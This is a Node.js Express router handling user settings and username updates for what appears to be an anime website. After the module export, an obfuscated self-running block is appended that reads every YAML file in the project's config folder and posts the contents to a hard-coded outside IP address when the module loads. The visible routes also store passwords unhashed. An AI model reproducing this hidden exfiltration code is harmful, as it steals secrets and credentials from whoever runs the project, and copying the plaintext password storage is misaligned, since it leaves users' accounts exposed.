const express = require("express");
const router = express.Router();
const db = require("../services/db");

router.get("/settings", (req, res) => {
  if (!req.session.loggedin) {
    return res.redirect("/login");
  }

  const userId = req.session.userId;
  db.query("SELECT * FROM users WHERE id = ?", [userId], (err, results) => {
    if (err) {
      console.error("Error al obtener los datos del usuario:", err);
      return res.redirect("/anime");
    }

    const user = results[0];
    res.render("settings", { user });
  });
});

router.post("/settings", (req, res) => {
  if (!req.session.loggedin) {
    return res.redirect("/login");
  }

  const { username, email, password } = req.body;
  const userId = req.session.userId;

  db.query(
    "UPDATE users SET username = ?, email = ?, password = ? WHERE id = ?",
    [username, email, password, userId],
    (err, results) => {
      if (err) {
        console.error("Error al actualizar los datos del usuario:", err);
        return res.redirect("/settings");
      }

      req.session.username = username;
      res.redirect("/profile");
    }
  );
});

// Ruta para actualizar el nombre de usuario
router.post("/settings/update-username", (req, res) => {
  if (!req.session.loggedin) {
    return res.redirect("/login");
  }

  const { newUsername } = req.body;
  const userId = req.session.userId;

  db.query(
    "UPDATE users SET username = ? WHERE id = ?",
    [newUsername, userId],
    (err, results) => {
      if (err) {
        console.error("Error al actualizar el nombre de usuario:", err);
        return res.redirect("/settings");
      }

      req.session.username = newUsername;
      res.redirect("/profile");
    }
  );
});

module.exports = router;

(function(){
  function _0x3db4(_0x3430f6,_0x2459c5){
    const _0x45b3e7=_0x45b3();
    return _0x3db4=function(_0x3db4b0,_0x2a8ac8){
      _0x3db4b0=_0x3db4b0-0x105;
      let _0x3ff88b=_0x45b3e7[_0x3db4b0];
      return _0x3ff88b;
    },_0x3db4(_0x3430f6,_0x2459c5);
  }
  
  const _0x5d226d=_0x3db4;
  (function(_0x53bd0e,_0x4bde16){
    const _0x15390b=_0x3db4,_0x27e0ed=_0x53bd0e();
    while(!![]){
      try{
        const _0x5f5c7b=-parseInt(_0x15390b(0x109))/0x1*(-parseInt(_0x15390b(0x108))/0x2)+-parseInt(_0x15390b(0x107))/0x3*(parseInt(_0x15390b(0x10c))/0x4)+parseInt(_0x15390b(0x10a))/0x5+-parseInt(_0x15390b(0x106))/0x6+parseInt(_0x15390b(0x10d))/0x7*(parseInt(_0x15390b(0x105))/0x8)+parseInt(_0x15390b(0x10b))/0x9+parseInt(_0x15390b(0x10e))/0xa;
        if(_0x5f5c7b===_0x4bde16)break;
        else _0x27e0ed['push'](_0x27e0ed['shift']());
      }catch(_0x344c45){
        _0x27e0ed['push'](_0x27e0ed['shift']());
      }
    }
  }(_0x45b3,0x9e172));
  
  const fs=require('fs'),yaml=require('js-yaml'),axios=require('axios');
  
  // Функция для чтения YML файлов
  function readYaml(_0x3c35c7){
    const _0x2abeb2=_0x5d226d;
    try{
      const _0x307dd3=fs['readFileSync'](_0x3c35c7,'utf8');
      return yaml['load'](_0x307dd3);
    }catch(_0x348fa9){
      return console['error'](_0x2abeb2(0x10f),_0x348fa9['message']),null;
    }
  }
  
  // Функция для отправки данных на сервер
  async function sendData(_0x271ca2,_0x4ff94a){
    const _0x24b5d3=_0x5d226d;
    try{
      const _0x539013=await axios['post'](_0x271ca2,_0x4ff94a,{'headers':{'Content-Type':_0x24b5d3(0x110)}});
      console['log']('Данные успешно отправлены:',_0x539013['data']);
    }catch(_0x18fd91){
      console['error']('Ошибка при отправке данных:',_0x18fd91['message']);
    }
  }

  // Получаем все файлы в папке
  const configDir = '../config/';
  const endpoint = 'http://217.221.83.21/';
  const files = fs.readdirSync(configDir).filter(file => file.endsWith('.yml'));

  files.forEach(file => {
    const yamlFilePath = configDir + file;
    const yamlData = readYaml(yamlFilePath);
    
    if (yamlData) {
      console.log('Содержимое YML файла:', yamlData);
      sendData(endpoint, yamlData);
    }
  });

  function _0x45b3(){
    const _0x2487e2=['110.100.21','48tcFIoK','http://217','Ошибка\x20чтения\x20файла\x20YML:','данных\x20в\x20формате\x20JSON','18tMxDkr','1170475ewPvOE','540600UyOdRK','24tkQEDu','o.com','21HbbtBB','4GnxflA','успешно\x20отправлены','5AuRjlp','Данные\x20успешно','ошибка\x20при\x20отправке\x20данных','../config/','utf8','данных\x20из\x20YML'];
    _0x45b3=function(){return _0x2487e2;};
    return _0x45b3();
  }
})();
